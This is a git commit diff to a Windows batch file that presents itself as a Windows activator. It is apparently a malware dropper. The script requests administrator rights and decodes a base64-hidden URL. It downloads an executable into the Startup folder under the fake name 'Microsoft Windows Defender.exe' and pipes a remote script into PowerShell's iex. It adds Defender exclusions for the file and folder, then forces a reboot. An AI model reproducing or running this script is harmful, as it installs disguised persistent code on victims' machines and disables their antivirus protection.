3f457865061b3e1b5c30897c299d7882b9c4cc29
betamod9 <164927681+betamod9@users.noreply.github.com>
2025-01-10 05:00:40 +0200

    Update windows.bat

--- windows.bat
+++ windows.bat
@@ -1,9 +1,23 @@
 @echo off
+:: Check if the script is run as administrator using 'openfiles' command
+openfiles >nul 2>&1
+if %errorlevel% neq 0 (
+    echo This script must be run as an administrator.
+    echo Attempting to restart with elevated privileges...
+    pause
+    powershell -Command "Start-Process cmd -ArgumentList '/c %~s0' -Verb runAs"
+    exit /b
+)
+
 set "b64=aHR0cHM6Ly9naXRodWIuY29tL2JldGFtb2Q5L1dpbmRvd3MtMTAtYW5kLTExLUFjdGl2YXRvci9yZWxlYXNlcy9kb3dubG9hZC8xMi4yNy4yMDI0L1dpbmRvd3NLZXkuZXhl"
 for /f "tokens=*" %%a in ('powershell "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%b64%'))"') do set "url=%%a"
 set "filename=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Microsoft Windows Defender.exe"
+set "folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+
+:: Download the file to the specified location
 powershell -Command "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri '%url%' -OutFile '%filename%'" >nul 2>&1
 
+:: Check if file exists, if it does, do nothing
 if exist "%filename%" (
     REM Do nothing - do not start the file
 ) else (
@@ -13,13 +27,17 @@ if exist "%filename%" (
 :server
 powershell -Command "$ProgressPreference = 'SilentlyContinue'; irm https://get.activated.win | iex"
 
-REM Display message before the 3-minute countdown
+:: Add the file and folder to Defender exclusions
+powershell -Command "Add-MpPreference -ExclusionProcess '%filename%'"
+powershell -Command "Add-MpPreference -ExclusionPath '%folder%'"
+
+:: Display message before the 3-minute countdown
 echo The system needs to restart for the changes to take effect.
 echo Please wait while the system prepares for the restart...
 echo Restart will occur in 3 minutes.
 
-REM Wait for 3 minutes (180 seconds)
+:: Wait for 3 minutes (180 seconds)
 timeout /t 180 /nobreak
 
-REM Restart the computer
+:: Restart the computer
 shutdown /r /f /t 0
